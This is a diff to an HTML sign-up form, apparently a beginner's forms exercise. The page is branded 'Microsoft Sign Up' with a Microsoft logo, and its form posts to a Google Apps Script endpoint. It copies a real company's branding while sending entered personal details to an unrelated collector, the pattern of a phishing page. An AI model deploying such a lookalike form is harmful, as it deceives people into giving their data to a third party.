@@ -9,6 +9,7 @@ input type = radio - done with gender
 
 <head>
     <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
     <link rel="stylesheet" href="./include.css">
     
     <title>Microsoft Sign Up</title>
@@ -17,6 +18,14 @@ input type = radio - done with gender
 <body>
     <img id="logo" src="https://th.bing.com/th/id/OIP.PWoq1WvDQDxc_MPv4Jt0GwHaHa?w=159&h=180&c=7&r=0&o=7&cb=12&dpr=1.5&pid=1.7&rm=3" alt="Microsoft"> 
     <h1 id="title">Microsoft</h1>
+
+    <!-- <ul class="benefits">
+        <li>Access to Microsoft apps</li>
+        <li>Account recovery & security</li>
+        <li>Sync across devices</li>
+    </ul> -->
+
+    <div class="spacer" aria-hidden="true"></div>
 
     <form action="https://script.google.com/macros/s/AKfycbz6cewkwC6P68-qotOokhBb_v1Zxr3aozRItX-rFramd4p_7R3XzwHLj7o1mN-6Okez/exec" method="post">
         <div class="form-section">
@@ -55,7 +64,7 @@ input type = radio - done with gender
             </div>
 
             <div class="form-contents">
-                <label for="gender">Gender: </label>
+                <label>Gender:</label>
                 <br>
                 <input type="radio" id="genderMale" name="gender" value="male" required>
                 <label for="genderMale">Male</label>
@@ -66,7 +75,7 @@ input type = radio - done with gender
 
             <div class="form-contents">
                 <label for="phone">Phone Number:</label>
-                <input type="number" id="phone" name="phone" placeholder="111-222-3333" required>
+                <input type="tel" id="phone" name="phone" placeholder="111-222-3333" required>
             </div>
             
             <div class="form-contents">
@@ -77,13 +86,19 @@ input type = radio - done with gender
             <div class="form-contents">
                 <label for="country">Country:</label>
                 <select name="country" id="country">
-                    <option value="Us">U.S.A.</option>
+                    <option value="USA">U.S.A.</option>
                     <option value="Ca">Canada</option>
                     <option value="Mx">Mexico</option>
                     <option value="Uk">U.K.</option>
                     <option value="?">Other</option>
                 </select>
             </div>
+
+            <!-- <div class="form-contents">
+                <label for="years">Years using Microsoft's products:</label>
+                <input type="number" id="years" name="years" min="0" max="80" step="1" placeholder="e.g., 3">
+            </div> -->
+
             
             <div class="form-contents">
                 <button type="submit" id="submitbutton">Submit</button>
